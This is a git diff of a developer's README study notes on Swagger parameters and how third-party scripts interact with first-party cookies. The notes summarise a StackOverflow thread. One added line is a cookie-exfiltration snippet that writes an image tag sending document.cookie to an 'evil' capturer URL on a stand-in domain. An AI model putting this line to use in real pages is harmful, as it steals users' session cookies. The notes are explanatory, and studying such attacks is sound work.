@@ -30,7 +30,7 @@ npm start
 
 ## Notes
 
-- body parameters swagger io
+- body parameters swagger io 2.0 depcrecated
 
   ```js
 
@@ -89,9 +89,24 @@ npm start
 - Ref: <https://javascript.info/cookie>
 - Only work with https
 
-```txt
+  ```txt
 
-  If we load a script from a third-party domain, like <script src="https://google-analytics.com/analytics.js">, and that script uses document.cookie to set a cookie, then such cookie is not third-party.
+    If we load a script from a third-party domain, like <script src="https://google-analytics.com/analytics.js">, and that script uses document.cookie to set a cookie, then such cookie is not third-party.
 
-  If a script sets a cookie, then no matter where the script came from – the cookie belongs to the domain of the current webpage.
-```
+    If a script sets a cookie, then no matter where the script came from – the cookie belongs to the domain of the current webpage.
+  ```
+
+- <https://stackoverflow.com/questions/20170040/can-a-third-party-script-set-a-first-party-cookie>
+
+  - Domain ```b.com``` load a script from domain ```a.com```
+  - I read on MDN Note: ***The domain must match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.*** Doesn't this contradict what you said? developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+  - A script from ```a.com``` can steal cookie of domain ```b.com``` by create a following tag and the cookie will be captured by server code of ```a.com``` domain
+
+    ```html
+    document.writeln("<img src='http://www.a.com/evil/data/capturer?" + document.cookie + "'>");
+    ```
+
+  - ==> Finally we only read cookie from thrid party script by ```document.cookie``` and can not set cookie by ```document.cookie = 'abc=ABC```
+  - ==> How do i set cookie for b.com domain ? 
+    - Create a iframe with ```src=b.com/?border-px1-cookie=response cookie json```
+    - Add handling set cookie at window onload event of home page
